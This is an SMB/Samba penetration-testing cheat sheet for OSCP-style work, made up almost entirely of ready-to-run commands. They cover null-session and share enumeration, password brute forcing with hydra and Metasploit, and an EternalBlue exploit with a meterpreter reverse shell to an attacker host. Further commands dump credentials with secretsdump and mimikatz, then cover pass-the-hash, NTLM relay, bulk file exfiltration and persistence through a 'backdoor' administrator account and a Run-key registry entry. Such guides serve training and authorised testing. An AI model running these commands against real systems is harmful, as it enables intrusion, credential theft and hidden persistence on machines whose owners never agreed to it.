# SMB / Samba Penetration Testing Guide (OSCP & Real-World)


**SMB (Server Message Block)** is a network file-sharing protocol used for:
- File sharing
- Printer sharing
- Named pipes
- Inter-process communication

### Default Ports
- **139/TCP** â€“ NetBIOS Session Service
- **445/TCP** â€“ SMB over TCP (modern)

### Common Targets
- Windows Servers / Workstations
- Active Directory environments
- Linux Samba servers
- NAS devices

---

## Pentesting Methodology (IMPORTANT)

Follow this order (OSCP mindset):

1. Port & Service Discovery  
2. SMB Version & Security Checks  
3. Anonymous / Null Session Enumeration  
4. Share Enumeration  
5. Credentialed Enumeration  
6. Password Policy & Auth Attacks  
7. Vulnerability Exploitation  
8. Post-Exploitation  
9. Lateral Movement  

---

## 1. Port & Service Discovery

```bash
nmap -p 139,445 --open -sV $target
````

Check SMB versions & protocols:

```bash
nmap -p 445 --script smb-protocols $target
```

Check SMB signing:

```bash
nmap -p 445 --script smb-security-mode $target
```

---

## 2. Banner Grabbing / NetBIOS Enumeration

```bash
nmblookup -A $target
nbtscan $target
nmap -n --script nbstat $target
```

> â„¹ï¸ Netcat on port 445 usually does **not** return useful banners.

---

## 3. Anonymous / Null Session Enumeration

> âš ï¸ Very powerful if misconfigured

### rpcclient

```bash
rpcclient -U "" -N $target
```

Useful commands inside rpcclient:

```text
enumdomusers
enumdomgroups
querydominfo
```

### smbclient

```bash
smbclient -L //$target -N
```

### smbmap

```bash
smbmap -H $target -u "" -p ""
```

---

## 4. SMB Share Enumeration

### Using smbclient

## ðŸ‘‰ **The username & password always belong to an ACCOUNT ON THE TARGET SYSTEM (or its DOMAIN)** 

```bash
smbclient -L //$target -U username%password
smbclient //$target/sharename -U username%password
```

### Using smbmap

```bash
smbmap -H $target
smbmap -H $target -u username -p password
smbmap -H $target -u username -p password -r
```

Download files:

```bash
smbmap -H $target -u username -p password -R sharename
```

---

## 5. User, Group & Domain Enumeration

### enum4linux

```bash
enum4linux -a $target
enum4linux -U $target
enum4linux -G $target
enum4linux -P $target
```

### Nmap NSE

```bash
nmap -p 445 --script smb-enum-users,smb-enum-shares $target
nmap -p 445 --script smb-enum-groups,smb-enum-domains $target
```

---

## 6. Password Policy & Authentication Attacks

### Password Policy

```bash
enum4linux -P $target
```

### âš ï¸ Brute Force (Use Carefully)

> Avoid brute force in real environments unless explicitly allowed.

#### Hydra

```bash
hydra -L users.txt -P passwords.txt smb://$target -f
```

#### Nmap

```bash
nmap -p 445 --script smb-brute $target
```

#### Metasploit

```text
use auxiliary/scanner/smb/smb_login
set RHOSTS $target
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run
```

---

## 7. CrackMapExec (HIGHLY RECOMMENDED)

CrackMapExec is **core** for OSCP+ & real-world SMB pentests.

```bash
crackmapexec smb $target
crackmapexec smb $target -u user -p password
crackmapexec smb $target -u user -H NTLM_HASH
crackmapexec smb $target --shares
```

---

## 8. SMB Vulnerability Scanning

```bash
nmap -p 139,445 --script smb-vuln* $target
```

Common CVEs:

* MS08-067 (Legacy)
* MS17-010 (EternalBlue)
* CVE-2020-0796 (SMBGhost)

> âš ï¸ Mostly lab / legacy systems in real life.

---

## 9. Exploitation (Metasploit Examples)

### MS17-010 (EternalBlue)

```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $target
set LHOST attacker_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

---

## 10. Post-Exploitation

### Credential Dumping

#### secretsdump (Impacket)

```bash
secretsdump.py domain/user:password@$target
secretsdump.py -hashes :NTLM_HASH user@$target
```

#### Mimikatz

```text
privilege::debug
sekurlsa::logonpasswords
```

---

## 11. Pass-the-Hash (VERY IMPORTANT)

```bash
crackmapexec smb $target -u user -H NTLM_HASH
impacket-psexec -hashes :NTLM_HASH user@$target
```

---

## 12. SMB Relay Attacks (If Signing Disabled)

```bash
responder -I eth0
ntlmrelayx.py -tf targets.txt -smb2support
```

> Requires SMB signing **disabled**.

---

## 13. Data Exfiltration

```bash
smbclient //$target/sharename -U user%pass
get sensitive.txt
mget *.docx
```

Recursive download:

```bash
smbget -R smb://$target/sharename -U user%pass
```

---

## 14. Persistence (Post-Compromise)

```cmd
net user backdoor P@ssw0rd123! /add
net localgroup administrators backdoor /add
```

Registry persistence:

```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\Windows\Temp\backdoor.exe
```

---

## 15. Lateral Movement

### SMB

```bash
impacket-psexec user@host
```

### WMI

```bash
wmic /node:host /user:user /password:pass process call create "cmd.exe"
```

---
